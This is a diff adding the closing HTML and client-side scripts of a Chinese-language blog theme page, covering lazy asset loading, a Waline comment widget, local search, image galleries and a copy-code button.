+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
